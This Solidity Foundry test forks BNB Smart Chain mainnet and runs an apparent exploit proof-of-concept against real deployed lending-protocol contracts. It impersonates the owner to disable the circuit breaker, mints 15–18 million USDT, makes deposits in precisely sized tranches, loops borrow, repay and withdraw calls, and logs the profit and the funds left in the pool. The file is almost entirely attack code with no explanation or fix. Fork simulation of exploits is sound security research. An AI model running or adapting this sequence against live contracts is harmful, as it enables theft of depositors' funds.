// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
import {Test, console2} from "forge-std/Test.sol";
interface IERC20B { function approve(address,uint256) external; function balanceOf(address) external view returns (uint256); }
interface IHB { function deposit(uint256,bool) external; function borrow(uint256,bool) external; function withdraw(uint256,bool) external; function repay(uint256,bool) external; }
interface ITMB { function setCircuitBreaker(bool) external; function getCircuitBreaker() external view returns (bool); }
interface IHV { function handlerViewProxy(bytes calldata) external returns (bool, bytes memory); }
contract BSCDiagTest is Test {
    address constant TM=0x8010F9E14C8286B9312e624370fdDC07fee2Fc75;
    address constant H=0x2A29598cbc17BA112C8Fd0E07Fbf5402eF57E6b8;
    address constant USDT=0x55d398326f99059fF775485246999027B3197955;
    address constant OWNER=0xf357a08C8D4A385Cebddb517a44b210A0F6b3393;
    function setUp() public { vm.createSelectFork("https://bsc-rpc.publicnode.com"); }
    function amt(address who) internal returns (uint256 d,uint256 b){ (bool ok, bytes memory r)=IHV(H).handlerViewProxy(abi.encodeWithSignature("getUserAmountWithInterest(address)",who)); require(ok); (d,b)=abi.decode(r,(uint256,uint256)); }
    function run(uint256 D) internal returns (uint256 profit, uint256 left) {
        vm.prank(OWNER); ITMB(TM).setCircuitBreaker(false);
        uint256 h0=IERC20B(USDT).balanceOf(H);
        deal(USDT, address(this), D);
        IERC20B(USDT).approve(H, type(uint256).max);
        uint256 a=D;
        IHB(H).deposit(a*2995/1_000_000,false);
        IHB(H).deposit(a*11964/1_000_000,false);
        IHB(H).deposit(a*44327/1_000_000,false);
        IHB(H).deposit(a*178736/1_000_000,false);
        IHB(H).deposit(a - a*2995/1_000_000 - a*11964/1_000_000 - a*44327/1_000_000 - a*178736/1_000_000,false);
        IHB(H).deposit(0,false);
        for (uint i=0;i<20;i++) IHB(H).borrow(a*37/1000,false);      // 3.7% of D
        for (uint i=0;i<20;i++){ IHB(H).repay(a*37/1000,false); IHB(H).withdraw(a*5/100,false); } // 5% of D
        IHB(H).repay(type(uint256).max,false);
        uint256 bal=IERC20B(USDT).balanceOf(H);
        if (bal>0) IHB(H).withdraw(bal,false);
        uint256 endBal=IERC20B(USDT).balanceOf(address(this));
        profit = endBal > D ? endBal - D : 0;
        left = IERC20B(USDT).balanceOf(H);
        console2.log("D",D); console2.log("  h0",h0); console2.log("  profit",profit); console2.log("  left",left);
        (uint256 dep,uint256 bor)=amt(address(this)); console2.log("  dep",dep); console2.log("  bor",bor);
    }
    function test_D15() public { run(15_000_000e18); }
    function test_D16() public { run(16_000_000e18); }
    function test_D17() public { run(17_000_000e18); }
    function test_D18() public { run(18_000_000e18); }
}
